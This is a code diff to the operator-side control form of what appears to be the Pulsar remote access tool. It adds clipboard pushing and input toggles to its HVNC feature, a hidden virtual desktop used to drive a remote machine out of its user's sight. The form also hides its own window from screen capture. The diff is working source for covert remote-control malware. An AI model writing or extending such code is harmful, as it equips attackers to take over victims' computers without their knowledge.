@@ -2,6 +2,7 @@
 using Pulsar.Common.Enums;
 using Pulsar.Common.Helpers;
 using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Monitoring.Clipboard;
 using Pulsar.Server.Forms.DarkMode;
 using Pulsar.Server.Helper;
 using Pulsar.Server.Messages;
@@ -10,6 +11,7 @@ using Pulsar.Server.Utilities;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
+using System.Threading;
 using System.Windows.Forms;
 using System.Diagnostics;
 using System.IO;
@@ -30,9 +32,14 @@ namespace Pulsar.Server.Forms
         private bool _enableKeyboardInput;
 
         /// <summary>
-        /// A list of pressed keys for synchronization between key down & -up events.
+        /// Monitors clipboard changes on the server to send to the client
         /// </summary>
-        private readonly List<Keys> _keysPressed;
+        private readonly ClipboardMonitor _clipboardMonitor;
+        
+        /// <summary>
+        /// States whether bidirectional clipboard sync is enabled
+        /// </summary>
+        private bool _enableBidirectionalClipboard;
 
         /// <summary>
         /// The client which can be used for the HVNC.
@@ -90,13 +97,35 @@ namespace Pulsar.Server.Forms
         {
             _connectClient = client;
             _hVNCHandler = new HVNCHandler(client);
-            _keysPressed = new List<Keys>();
+            _clipboardMonitor = new ClipboardMonitor(client);
 
             RegisterMessageHandler();
             InitializeComponent();
 
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            UpdateInputButtonsVisualState();
+        }
+
+        private void UpdateInputButtonsVisualState()
+        {
+            UpdateButtonState(btnMouse, _enableMouseInput);
+            UpdateButtonState(btnKeyboard, _enableKeyboardInput);
+            UpdateButtonState(btnBiDirectionalClipboard, _enableBidirectionalClipboard);
+        }
+
+        private void UpdateButtonState(Button button, bool enabled)
+        {
+            if (enabled)
+            {
+                button.BackColor = Color.FromArgb(0, 120, 0); // Dark green
+                button.FlatAppearance.BorderColor = Color.LimeGreen;
+            }
+            else
+            {
+                button.BackColor = Color.FromArgb(40, 40, 40); // Default dark
+                button.FlatAppearance.BorderColor = Color.Gray;
+            }
         }
 
         /// <summary>
@@ -304,6 +333,7 @@ namespace Pulsar.Server.Forms
             if (_hVNCHandler.IsStarted) StopStream();
             UnregisterMessageHandler();
             _hVNCHandler.Dispose();
+            _clipboardMonitor?.Dispose();
             picDesktop.Image?.Dispose();
         }
 
@@ -357,41 +387,85 @@ namespace Pulsar.Server.Forms
 
         private void btnMouse_Click(object sender, EventArgs e)
         {
+            _enableMouseInput = !_enableMouseInput;
+            
             if (_enableMouseInput)
-            {
-                this.picDesktop.Cursor = Cursors.Default;
-                btnMouse.Image = Properties.Resources.mouse_delete;
-                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
-                _enableMouseInput = false;
-            }
-            else
             {
                 this.picDesktop.Cursor = Cursors.Hand;
                 btnMouse.Image = Properties.Resources.mouse_add;
+                btnMouse.BackColor = Color.LightGreen;
                 toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
-                _enableMouseInput = true;
+            }
+            else
+            {
+                this.picDesktop.Cursor = Cursors.Default;
+                btnMouse.Image = Properties.Resources.mouse_delete;
+                btnMouse.BackColor = DefaultBackColor;
+                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
             }
 
+            UpdateInputButtonsVisualState();
             this.ActiveControl = picDesktop;
         }
 
         private void btnKeyboard_Click(object sender, EventArgs e)
         {
+            _enableKeyboardInput = !_enableKeyboardInput;
+            
             if (_enableKeyboardInput)
-            {
-                this.picDesktop.Cursor = Cursors.Default;
-                btnKeyboard.Image = Properties.Resources.keyboard_delete;
-                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
-                _enableKeyboardInput = false;
-            }
-            else
             {
                 this.picDesktop.Cursor = Cursors.Hand;
                 btnKeyboard.Image = Properties.Resources.keyboard_add;
+                btnKeyboard.BackColor = Color.LightGreen;
                 toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
-                _enableKeyboardInput = true;
+            }
+            else
+            {
+                this.picDesktop.Cursor = Cursors.Default;
+                btnKeyboard.Image = Properties.Resources.keyboard_delete;
+                btnKeyboard.BackColor = DefaultBackColor;
+                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
             }
 
+            UpdateInputButtonsVisualState();
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnBiDirectionalClipboard_Click(object sender, EventArgs e)
+        {
+            _enableBidirectionalClipboard = !_enableBidirectionalClipboard;
+            UpdateInputButtonsVisualState();
+
+            _clipboardMonitor.IsEnabled = _enableBidirectionalClipboard;
+            Debug.WriteLine(_clipboardMonitor.IsEnabled ? "HVNC: Clipboard monitor enabled." : "HVNC: Clipboard monitor disabled.");
+
+            if (_enableBidirectionalClipboard)
+            {
+                Thread clipboardThread = new Thread(() =>
+                {
+                    try
+                    {
+                        Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
+                        
+                        if (Clipboard.ContainsText())
+                        {
+                            string clipboardText = Clipboard.GetText();
+                            if (!string.IsNullOrEmpty(clipboardText))
+                            {
+                                Debug.WriteLine($"HVNC: Sending initial clipboard: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
+                                _connectClient.Send(new SendClipboardData { ClipboardText = clipboardText });
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"HVNC: Error sending initial clipboard: {ex.Message}");
+                    }
+                });
+                clipboardThread.SetApartmentState(ApartmentState.STA);
+                clipboardThread.Start();
+            }
+            
             this.ActiveControl = picDesktop;
         }
 
